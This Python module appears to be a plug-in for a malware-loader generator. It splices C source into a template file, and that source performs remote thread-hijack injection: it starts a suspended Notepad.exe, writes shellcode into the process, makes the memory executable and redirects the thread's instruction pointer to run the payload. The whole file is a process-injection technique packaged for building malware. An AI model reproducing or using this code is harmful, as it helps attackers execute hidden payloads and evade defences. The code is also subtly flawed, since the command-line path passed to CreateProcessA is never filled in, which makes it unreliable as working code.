def desc():
    return "Use a remote Thread Hijack to run the payload"

def run():
    libs = '''\
#define TARGET_PROC "Notepad.exe" // Target process to inject
'''
    functions = '''\
BOOL CreateSuspendedProcess (IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {
	CHAR				    lpPath          [MAX_PATH * 2];
	CHAR				    WnDr            [MAX_PATH];

	STARTUPINFO			    Si              = { 0 };
	PROCESS_INFORMATION		Pi              = { 0 };

	// Cleaning the structs by setting the member values to 0
	RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

	// Setting the size of the structure
	Si.cb = sizeof(STARTUPINFO);

	// Getting the value of the %WINDIR% environment variable
	if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
		return FALSE;
	}

	if (!CreateProcessA(
		NULL,					// No module name (use command line)
		lpPath,					// Command line
		NULL,					// Process handle not inheritable
		NULL,					// Thread handle not inheritable
		FALSE,					// Set handle inheritance to FALSE
		CREATE_SUSPENDED,		// Creation flag
		NULL,					// Use parent's environment block
		NULL,					// Use parent's starting directory 
		&Si,					// Pointer to STARTUPINFO structure
		&Pi)) {					// Pointer to PROCESS_INFORMATION structure

		return FALSE;
	}

	// Populating the OUT parameters with CreateProcessA's output
	*dwProcessId    = Pi.dwProcessId;
	*hProcess       = Pi.hProcess;
	*hThread        = Pi.hThread;
	
	// Doing a check to verify we got everything we need
	if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
		return TRUE;

	return FALSE;
}

BOOL InjectToRemoteProcess (IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, OUT PVOID* ppAddress) {
	SIZE_T  sNumberOfBytesWritten    = NULL;
	DWORD   dwOldProtection          = NULL;


	*ppAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (*ppAddress == NULL) {
		return FALSE;
	}

	if (!WriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
		return FALSE;
	}

	if (!VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		return FALSE;
	}

	return TRUE;
}

BOOL HijackThread(IN HANDLE hThread, IN PVOID pAddress) {
	CONTEXT		ThreadCtx = {
			.ContextFlags = CONTEXT_CONTROL
	};

	// getting the original thread context
	if (!GetThreadContext(hThread, &ThreadCtx)) {
		return FALSE;
	}

	 // updating the next instruction pointer to be equal to our shellcode's address 
	ThreadCtx.Rip = pAddress;

	// setting the new updated thread context
	if (!SetThreadContext(hThread, &ThreadCtx)) {
		return FALSE;
	}

	// resuming suspended thread, thus running our payload
	ResumeThread(hThread);

	WaitForSingleObject(hThread, INFINITE);

	return TRUE;
}
'''
    execution = '''\
	HANDLE		hProcess	= NULL,
				hThread		= NULL;
	DWORD		dwProcessId = NULL;
	PVOID		pAddress	= NULL;

	// Creating sacrificial remote process in suspended state
	if (!CreateSuspendedProcess(TARGET_PROC, &dwProcessId, &hProcess, &hThread)) {
		return -1;
	}

	// Write Shellcode to remote proc
	if (!InjectToRemoteProcess(hProcess, pShellcode, sPayloadSize, &pAddress)) {
		return -1;
	}

	// Hijack thread to run payload
	if (!HijackThread(hThread, pAddress)) {
		return -1;
	}\
'''
    # Read the content of the input file
    with open("./src/main.c", 'r') as file:
        content = file.read()

    # Replace the template
    modified_content = content.replace("{{LIBS}}", libs + "\n{{LIBS}}") \
                              .replace("{{FUNCTIONS}}", functions + "\n{{FUNCTIONS}}") \
                              .replace("{{EXECUTION}}", execution)

    # Write the modified content to the output file
    with open("./src/main.c", 'w') as file:
        file.write(modified_content)
    
    return